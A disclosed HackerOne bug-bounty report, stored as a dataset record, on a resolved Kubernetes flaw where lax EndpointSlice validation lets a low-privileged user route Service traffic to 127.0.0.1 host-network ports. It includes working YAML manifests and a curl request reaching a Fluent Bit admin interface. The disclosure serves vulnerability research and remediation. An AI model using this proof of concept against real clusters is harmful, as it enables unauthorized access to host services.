---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1145044'
original_report_id: '1145044'
title: Holes in EndpointSlice Validation Enable Host Network Hijack
weakness: Privilege Escalation
team_handle: kubernetes
created_at: '2021-04-02T00:59:23.658Z'
disclosed_at: '2021-09-05T23:29:06.790Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
asset_identifier: https://github.com/kubernetes/kubernetes
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- privilege-escalation
---

# Holes in EndpointSlice Validation Enable Host Network Hijack

## Metadata

- HackerOne Report ID: 1145044
- Weakness: Privilege Escalation
- Program: kubernetes
- Disclosed At: 2021-09-05T23:29:06.790Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
A user with permission to create Services and EndpointSlices can configure these resources to allow sending traffic to arbitrary ports in the host network.

## Kubernetes Version:
Any version with `EndpointSliceProxying` enabled, default in 1.19+

## Component Version:
1.19+

## Steps To Reproduce:

Apply YAML:
```
apiVersion: v1
kind: Service
metadata:
  labels:
    component: apiserver
  name: hijack
  namespace: attacker
spec:
  ports:
  - name: http
    port: 2020
    protocol: TCP
---
addressType: IPv4
apiVersion: discovery.k8s.io/v1beta1
endpoints:
- addresses:
  - 127.0.0.1
  conditions:
    ready: true
kind: EndpointSlice
metadata:
  labels:
    kubernetes.io/service-name: hijack
  name: hijack
  namespace: attacker
ports:
- name: http
  port: 2020
  protocol: TCP
```

Inside a pod in the cluster, send a curl request to the service:
```
$ curl hijack.attacker:2020/api/v1/uptime
{"uptime_sec":57070,"uptime_hr":"Fluent Bit has been running:  0 day, 15 hours, 51 minutes and 10 seconds"}
```

Here I chose to reach the Fluent Bit admin interface running on port 2020 in the host network; any other services can also be hit by adding the port into the Service and EndpointSlice.

## Supporting Material/References:

This vulnerability does not apply to Endpoints, which would reject this in validation: https://github.com/kubernetes/kubernetes/blob/a651804427dd9a15bb91e1c4fb7a79994e4817a2/pkg/apis/core/validation/validation.go#L5762.

However, EndpointSlice validation is more lenient: https://github.com/kubernetes/kubernetes/blob/a651804427dd9a15bb91e1c4fb7a79994e4817a2/staging/src/k8s.io/apimachinery/pkg/util/validation/validation.go#L356

## Impact

User with permission to create Services and EndpointSlice, a relatively unprivileged role, can access arbitrary services in the host network.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
